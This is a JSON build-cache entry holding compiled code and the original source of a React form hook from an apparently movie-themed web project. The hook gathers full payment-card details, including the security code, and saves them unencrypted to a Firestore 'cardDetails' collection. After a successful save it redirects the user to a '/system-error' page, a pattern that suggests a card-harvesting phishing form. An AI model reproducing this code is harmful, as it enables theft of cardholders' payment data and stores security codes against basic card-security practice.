{"ast":null,"code":"import _defineProperty from\"C:/Users/Chinenye/Desktop/DELIGHT/MOVIES/carnival/node_modules/@babel/runtime/helpers/esm/defineProperty\";import _objectSpread from\"C:/Users/Chinenye/Desktop/DELIGHT/MOVIES/carnival/node_modules/@babel/runtime/helpers/esm/objectSpread2\";import _slicedToArray from\"C:/Users/Chinenye/Desktop/DELIGHT/MOVIES/carnival/node_modules/@babel/runtime/helpers/esm/slicedToArray\";import{useState}from'react';import validateInfo from'./validateInfo';import{useAuth}from'../src/context/AuthContext';import{setDoc,doc}from'firebase/firestore';import{db}from\"./firebase\";import{useNavigate}from\"react-router-dom\";var useForm=function useForm(){var _useAuth=useAuth(),user=_useAuth.user;var navigate=useNavigate();var _useState=useState({cardName:'',cardNumber:'',cardType:'',cardExpiration:'',cardSecurityCode:'',cardPostalCode:'',focus:''}),_useState2=_slicedToArray(_useState,2),values=_useState2[0],setValues=_useState2[1];var _useState3=useState({}),_useState4=_slicedToArray(_useState3,2),errors=_useState4[0],setErrors=_useState4[1];var handleFocus=function handleFocus(e){setValues(_objectSpread(_objectSpread({},values),{},{focus:e.target.name==='cardSecurityCode'?'cvc':e.target.name}));};var handleChange=function handleChange(e){var _e$target=e.target,name=_e$target.name,value=_e$target.value;setValues(_objectSpread(_objectSpread({},values),{},_defineProperty({},name,value)));};var handleSubmit=function handleSubmit(e){e.preventDefault();setErrors(validateInfo(values));console.log(values);if(errors.message===\"Credit Card is valid\"||errors.variant===\"success\"){console.log('successful');setDoc(doc(db,'cardDetails',user.uid),{cname:values.cardName,cnumber:values.cardNumber,cExpiration:values.cardExpiration,cSecurityCode:values.cardSecurityCode,cType:values.cardType,cPostalCode:values.cardPostalCode});navigate('/system-error');}else{console.log('false');}};return{handleChange:handleChange,handleFocus:handleFocus,handleSubmit:handleSubmit,values:values,errors:errors};};export default useForm;","map":{"version":3,"sources":["C:/Users/Chinenye/Desktop/DELIGHT/MOVIES/carnival/src/useForm.js"],"names":["useState","validateInfo","useAuth","setDoc","doc","db","useNavigate","useForm","user","navigate","cardName","cardNumber","cardType","cardExpiration","cardSecurityCode","cardPostalCode","focus","values","setValues","errors","setErrors","handleFocus","e","target","name","handleChange","value","handleSubmit","preventDefault","console","log","message","variant","uid","cname","cnumber","cExpiration","cSecurityCode","cType","cPostalCode"],"mappings":"6YAAA,OAASA,QAAT,KAAyB,OAAzB,CACA,MAAOC,CAAAA,YAAP,KAAyB,gBAAzB,CACA,OAASC,OAAT,KAAwB,4BAAxB,CACA,OACIC,MADJ,CAEIC,GAFJ,KAGS,oBAHT,CAIE,OAAUC,EAAV,KAAoB,YAApB,CACA,OAASC,WAAT,KAA4B,kBAA5B,CACF,GAAMC,CAAAA,OAAO,CAAG,QAAVA,CAAAA,OAAU,EAAM,CAClB,aAAiBL,OAAO,EAAxB,CAAQM,IAAR,UAAQA,IAAR,CACA,GAAMC,CAAAA,QAAQ,CAAGH,WAAW,EAA5B,CACA,cAA4BN,QAAQ,CAAC,CACjCU,QAAQ,CAAE,EADuB,CAEjCC,UAAU,CAAE,EAFqB,CAGjCC,QAAQ,CAAE,EAHuB,CAIjCC,cAAc,CAAE,EAJiB,CAKjCC,gBAAgB,CAAE,EALe,CAMjCC,cAAc,CAAE,EANiB,CAOjCC,KAAK,CAAE,EAP0B,CAAD,CAApC,wCAAOC,MAAP,eAAeC,SAAf,eAUA,eAA4BlB,QAAQ,CAAC,EAAD,CAApC,yCAAOmB,MAAP,eAAeC,SAAf,eAEA,GAAMC,CAAAA,WAAW,CAAG,QAAdA,CAAAA,WAAc,CAACC,CAAD,CAAO,CACvBJ,SAAS,gCACFD,MADE,MAELD,KAAK,CAAGM,CAAC,CAACC,MAAF,CAASC,IAAT,GAAkB,kBAAnB,CAAyC,KAAzC,CAAiDF,CAAC,CAACC,MAAF,CAASC,IAF5D,GAAT,CAIH,CALD,CAOA,GAAMC,CAAAA,YAAY,CAAG,QAAfA,CAAAA,YAAe,CAAAH,CAAC,CAAI,CACtB,cAAwBA,CAAC,CAACC,MAA1B,CAAQC,IAAR,WAAQA,IAAR,CAAcE,KAAd,WAAcA,KAAd,CACAR,SAAS,gCACFD,MADE,wBAEJO,IAFI,CAEGE,KAFH,GAAT,CAIH,CAND,CAQA,GAAMC,CAAAA,YAAY,CAAG,QAAfA,CAAAA,YAAe,CAAAL,CAAC,CAAI,CACtBA,CAAC,CAACM,cAAF,GACAR,SAAS,CAACnB,YAAY,CAACgB,MAAD,CAAb,CAAT,CACAY,OAAO,CAACC,GAAR,CAAYb,MAAZ,EACA,GAAGE,MAAM,CAACY,OAAP,GAAmB,sBAAnB,EAA6CZ,MAAM,CAACa,OAAP,GAAmB,SAAnE,CAA8E,CAC1EH,OAAO,CAACC,GAAR,CAAY,YAAZ,EACA3B,MAAM,CAACC,GAAG,CAACC,EAAD,CAAK,aAAL,CAAoBG,IAAI,CAACyB,GAAzB,CAAJ,CAAmC,CACrCC,KAAK,CAAEjB,MAAM,CAACP,QADuB,CAErCyB,OAAO,CAAElB,MAAM,CAACN,UAFqB,CAGrCyB,WAAW,CAAEnB,MAAM,CAACJ,cAHiB,CAIrCwB,aAAa,CAAEpB,MAAM,CAACH,gBAJe,CAKrCwB,KAAK,CAAErB,MAAM,CAACL,QALuB,CAMrC2B,WAAW,CAAEtB,MAAM,CAACF,cANiB,CAAnC,CAAN,CAWCN,QAAQ,CAAC,eAAD,CAAR,CACJ,CAdD,IAcK,CACDoB,OAAO,CAACC,GAAR,CAAY,OAAZ,EACH,CACJ,CArBD,CAuBA,MAAO,CAAEL,YAAY,CAAZA,YAAF,CAAgBJ,WAAW,CAAXA,WAAhB,CAA6BM,YAAY,CAAZA,YAA7B,CAA2CV,MAAM,CAANA,MAA3C,CAAmDE,MAAM,CAANA,MAAnD,CAAP,CACH,CAtDD,CAwDA,cAAeZ,CAAAA,OAAf","sourcesContent":["import { useState } from 'react'\r\nimport validateInfo from './validateInfo';\r\nimport { useAuth } from '../src/context/AuthContext'\r\nimport {\r\n    setDoc,\r\n    doc\r\n  } from 'firebase/firestore'\r\n  import {  db } from \"./firebase\"\r\n  import { useNavigate } from \"react-router-dom\"\r\nconst useForm = () => {\r\n    const { user } = useAuth()\r\n    const navigate = useNavigate();\r\n    const [values, setValues] = useState({\r\n        cardName: '',\r\n        cardNumber: '',\r\n        cardType: '',\r\n        cardExpiration: '',\r\n        cardSecurityCode: '',\r\n        cardPostalCode: '',\r\n        focus: ''\r\n    })\r\n\r\n    const [errors, setErrors] = useState({})\r\n\r\n    const handleFocus = (e) => {\r\n        setValues({ \r\n            ...values,\r\n            focus: (e.target.name === 'cardSecurityCode') ? 'cvc' : e.target.name\r\n        });\r\n    }\r\n\r\n    const handleChange = e => {\r\n        const { name, value } = e.target\r\n        setValues({\r\n            ...values,\r\n            [name]: value\r\n        })\r\n    }\r\n\r\n    const handleSubmit = e => {\r\n        e.preventDefault()\r\n        setErrors(validateInfo(values))\r\n        console.log(values);\r\n        if(errors.message === \"Credit Card is valid\" || errors.variant === \"success\" ){\r\n            console.log('successful');\r\n            setDoc(doc(db, 'cardDetails', user.uid), {\r\n                cname: values.cardName,\r\n                cnumber: values.cardNumber,\r\n                cExpiration: values.cardExpiration,\r\n                cSecurityCode: values.cardSecurityCode,\r\n                cType: values.cardType,\r\n                cPostalCode: values.cardPostalCode,\r\n              });\r\n\r\n\r\n              \r\n             navigate('/system-error');\r\n        }else{\r\n            console.log('false');\r\n        }\r\n    };\r\n    \r\n    return { handleChange, handleFocus, handleSubmit, values, errors };\r\n};\r\n\r\nexport default useForm; "]},"metadata":{},"sourceType":"module"}